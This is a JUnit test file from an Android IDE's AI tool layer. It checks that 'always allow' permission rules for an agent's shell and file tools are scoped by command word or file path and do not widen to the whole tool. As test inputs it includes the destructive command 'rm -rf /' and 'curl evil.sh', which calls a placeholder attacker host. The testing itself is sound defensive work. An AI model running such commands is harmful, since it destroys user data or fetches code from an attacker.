/*
 * This file is part of AndroidCodeStudio.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package com.tom.rv2ide.ai.tool;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import org.junit.jupiter.api.Test;

/**
 * 授权规则粒度的回归测试。
 *
 * <p><b>为什么需要它</b>：这里的粒度直接决定「始终允许」是不是一个安全的选项。
 * 粒度退化成按工具名授权时，用户对 {@code shell_execute "ls"} 点一次「始终允许」
 * 就等于放行 {@code shell_execute "rm -rf /"}——这是提权路径，必须有测试钉住。
 */
final class ToolPermissionRuleTest {

  private static String shell(String command) {
    return "{\"command\":\"" + command + "\"}";
  }

  @Test
  void shellRuleIsScopedToFirstWord() {
    String ls = ToolPermissionRule.keyFor("shell_execute", shell("ls -la"));
    String gitStatus = ToolPermissionRule.keyFor("shell_execute", shell("git status"));
    String gitPush = ToolPermissionRule.keyFor("shell_execute", shell("git push --force"));

    // 同首词、不同参数 → 同一条规则（否则用户要为一个 git 反复点确认）
    assertEquals(gitStatus, gitPush);
    // 不同首词 → 不同规则（这是安全边界）
    assertNotEquals(ls, gitStatus);
  }

  @Test
  void authorizingOneCommandDoesNotAuthorizeAnother() {
    String authorized = ToolPermissionRule.keyFor("shell_execute", shell("git status"));

    // 用户点过「始终允许 git status」后，这条不能匹配 rm
    assertNotEquals(authorized, ToolPermissionRule.keyFor("shell_execute", shell("rm -rf /")));
    assertNotEquals(authorized, ToolPermissionRule.keyFor("shell_execute", shell("curl evil.sh")));
  }

  @Test
  void firstWordHandlesSurroundingWhitespace() {
    // 命令可能以多个空格或制表符开头；不 trim 会得到空首词，规则退化为按工具授权。
    String padded = ToolPermissionRule.keyFor("shell_execute", shell("   git   status"));
    String plain = ToolPermissionRule.keyFor("shell_execute", shell("git status"));
    assertEquals(plain, padded);
  }

  @Test
  void singleWordCommandHasNoTrailingSeparatorArtifact() {
    assertEquals("shell_execute\u0000ls", ToolPermissionRule.keyFor("shell_execute", shell("ls")));
  }

  @Test
  void fileWriteRuleIsScopedToPath() {
    String a = ToolPermissionRule.keyFor("file_write", "{\"file_path\":\"/sdcard/proj/A.kt\"}");
    String b = ToolPermissionRule.keyFor("file_write", "{\"file_path\":\"/sdcard/proj/B.kt\"}");

    // 放行写 A.kt 不等于放行写 B.kt
    assertNotEquals(a, b);
    assertTrue(a.startsWith("file_write\u0000"));
  }

  @Test
  void fileEditSharesPathScopingWithWrite() {
    String write = ToolPermissionRule.keyFor("file_write", "{\"file_path\":\"/p/A.kt\"}");
    String edit = ToolPermissionRule.keyFor("file_edit", "{\"file_path\":\"/p/A.kt\"}");

    // 写与改是不同工具，路径相同也不共用规则——改文件的破坏力与新建不同。
    assertNotEquals(write, edit);
  }

  @Test
  void unknownToolFallsBackToToolLevelScope() {
    // 没有可提取的判别字段 → 空 scope，规则退化为按工具授权。
    String key = ToolPermissionRule.keyFor("some_other_tool", "{\"x\":1}");
    assertEquals("some_other_tool\u0000", key);
  }

  @Test
  void malformedArgumentsDoNotCrashAndProduceToolLevelRule() {
    // 模型偶尔给出截断的 JSON 片段。不能抛异常，也不能误提取出判别字段。
    String key = ToolPermissionRule.keyFor("shell_execute", "{\"command\":\"git stat");
    assertEquals("shell_execute\u0000", key);
  }

  @Test
  void nullAndEmptyInputsAreHandled() {
    assertEquals("", ToolPermissionRule.keyFor(null, null));
    assertEquals("", ToolPermissionRule.keyFor("", "{}"));
    // 空参数 → 无判别字段，按工具授权
    assertEquals("shell_execute\u0000", ToolPermissionRule.keyFor("shell_execute", null));
    assertEquals("shell_execute\u0000", ToolPermissionRule.keyFor("shell_execute", "  "));
  }

  @Test
  void aliasIsCanonicalizedSoRulesSurviveModelAliases() {
    // 模型常写 bash / sh 而不是 shell_execute。授权与判定若用不同名字，
    // 用户点过的「始终允许」会静默失效，表现为反复弹窗。
    String viaAlias = ToolPermissionRule.keyFor("bash", shell("ls"));
    String viaCanonical = ToolPermissionRule.keyFor("shell_execute", shell("ls"));
    assertEquals(viaCanonical, viaAlias);
  }

  @Test
  void concatenationIsUnambiguous() {
    // 工具名与 scope 之间用 NUL 分隔，因此不存在拼接歧义。
    // 若用 ':' 或 '_'，下面两条会撞车（"a_b" + "c" vs "a" + "b_c"）。
    assertNotEquals(
        ToolPermissionRule.keyFor("a_b", "{\"file_path\":\"c\"}"),
        ToolPermissionRule.keyFor("a", "{\"file_path\":\"b_c\"}"));
  }

  @Test
  void describeShowsToolAndScopeForSettingsUi() {
    assertEquals(
        "shell_execute: git",
        ToolPermissionRule.describe(ToolPermissionRule.keyFor("shell_execute", shell("git push"))));
    // 无 scope 时只显示工具名，不留悬空分隔符
    assertEquals("some_tool", ToolPermissionRule.describe("some_tool\u0000"));
    assertEquals("", ToolPermissionRule.describe(null));
    assertEquals("", ToolPermissionRule.describe(""));
  }

  @Test
  void describeTruncatesLongPathsButKeepsBothEnds() {
    String longPath = "/storage/emulated/0/Android/data/com.example/files/a/very/long/path/File.kt";
    String described = ToolPermissionRule.describe("file_write\u0000" + longPath);

    assertTrue(described.startsWith("file_write: /storage"), described);
    assertTrue(described.endsWith("File.kt"), described);
    assertTrue(described.contains("…"), described);
  }

  @Test
  void fileDeleteIsScopedToItsPathArrayNotToolLevel() {
    // file_delete 的参数是 paths 数组而非 file_path 单值。若只按单值键提取会拿到空
    // scope，于是「始终允许删除 A.kt」变成「始终允许删除任何文件」——最具破坏力的
    // 工具反而拿到最宽的授权。这里钉住它必须有路径粒度。
    String delA = ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/A.kt\"]}");
    String delB = ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/B.kt\"]}");

    assertNotEquals(delA, delB);
    assertNotEquals("file_delete\u0000", delA);
    assertTrue(delA.contains("/p/A.kt"), delA);
  }

  @Test
  void fileDeleteScopesCoverEveryPathInTheCall() {
    // 一次调用删多个文件时，只按首个路径授权会让其余删除被悄悄连带放行。
    String two = ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/A.kt\",\"/p/B.kt\"]}");
    String onlyA = ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/A.kt\"]}");
    String onlyB = ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/B.kt\"]}");

    assertNotEquals(onlyA, two);
    assertNotEquals(onlyB, two);
  }

  @Test
  void fileDeleteWithoutPathsFallsBackToToolLevel() {
    // 没有路径可判别时退化为工具级授权。此时粒度确实宽，但调用本身也会被
    // FileDeleteTool 以「路径为空」拒绝，因此不会形成提权路径。
    assertEquals("file_delete\u0000", ToolPermissionRule.keyFor("file_delete", "{\"reason\":\"x\"}"));
  }

  @Test
  void fileDeleteDescribeRendersPathsReadably() {
    String described =
        ToolPermissionRule.describe(
            ToolPermissionRule.keyFor("file_delete", "{\"paths\":[\"/p/A.kt\",\"/p/B.kt\"]}"));
    // scope 内部的不可见连接符要换成逗号，否则设置页会显示成一个粘连的长串
    assertEquals("file_delete: /p/A.kt,/p/B.kt", described);
  }
}
